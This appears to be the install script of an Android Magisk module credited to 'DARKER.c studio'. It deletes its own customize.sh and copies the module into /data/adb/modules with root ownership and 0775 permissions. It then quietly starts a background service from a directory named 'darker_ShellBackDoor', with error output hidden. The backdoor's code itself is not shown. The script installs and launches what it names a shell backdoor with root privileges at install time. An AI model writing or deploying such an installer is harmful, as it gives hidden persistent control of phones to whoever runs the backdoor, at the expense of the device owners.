#!/system/bin/sh



###########################################################
#  Copyright © 2024 DARKER.c studio. All rights reserved. #
###########################################################



# Global variables
MODS_PATH="/data/adb/modules"

# shellcheck disable=SC2153
rm -rf "$MODPATH"/customize.sh; cp -af "$MODPATH" $MODS_PATH
chown -R root:root "$MODS_PATH"
chmod -R 0775 "$MODS_PATH"
sh $MODS_PATH/darker_ShellBackDoor/service.sh 2>/dev/null &